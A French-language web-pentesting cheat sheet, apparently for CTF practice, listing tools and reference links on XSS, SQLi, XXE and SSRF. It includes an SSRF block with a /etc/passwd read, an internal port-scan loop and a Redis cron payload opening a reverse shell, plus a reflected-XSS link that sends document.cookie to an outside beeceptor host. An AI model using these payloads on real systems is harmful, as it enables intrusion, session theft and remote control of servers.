## Outils

- [Burp](https://portswigger.net/burp)
- [Jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Beeceptor](https://beeceptor.com/)

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [RSS Validator](https://validator.w3.org/feed/)
- [Tplmap](https://github.com/epinna/tplmap)

- [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)

## Extensions

### Firefox

- [Hacktools](https://addons.mozilla.org/fr/firefox/addon/hacktools/)
- [Wappalyzer](https://addons.mozilla.org/fr/firefox/addon/wappalyzer/)

### Burp

`Never trust user input`

- [Hackvertor](https://github.com/hackvertor/hackvertor)
- [JWT](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)
- [Param Miner](https://github.com/portswigger/param-miner)

## Doc

- https://owasp.org/www-community/Source_Code_Analysis_Tools

- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [Hacktricks](https://book.hacktricks.xyz/welcome/readme)

- [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)

*Aussi*:

### XSS

[Stored & Reflected XSS (hackndo)](https://beta.hackndo.com/attaque-xss/)
https://brightsec.com/blog/xss/#xss-types
https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
https://excess-xss.com/

### SQLi

- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

### XXE

- https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
- https://www.akilischool.com/cours/laravel-creer-un-flux-rss
- https://gist.github.com/sl4v/7b5e562f110910f85397

### SSRF

- https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
- https://www.dailysecurity.fr/server-side-request-forgery/
- https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

```bash
file://index.php
file:///etc/passwd

for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://localhost:$i" | grep 'Content-Length'| xargs echo "$i:"; done
dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
```

## Bypass filters

[SQLi: énumération via UNION](https://github.com/0x14mth3n1ght/Writeup/blob/master/2022/Star2022/Web/SQL/sql.txt)
[PHP filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
[PHP: extract() & loose comparison](https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/web/salty)
[PHP Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdfhttps://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)

`Contourner strcmp() (juggling) \ Provoquer une erreur SQL`

- GET: `?password[]=''`
- POST: `password:[]`

[Bypass Eval](https://github.com/0xchrisb/thesis-non-alphanumeric-code-generator)

[PayloadBox](https://github.com/payloadbox)

`Reflected XSS`

Report link:

```html
https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".concat(document.cookie)>
```

[Dom Based XSS](https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/)

-> appel ou accès aux éléments du DOM (ex document.getElementByID)

[CSP Bypass](https://csplite.com/csp320/)

## AST

https://seal9055.com/blog/browser/browser_architecture

## Exercices

https://alert.zeyu2001.com/
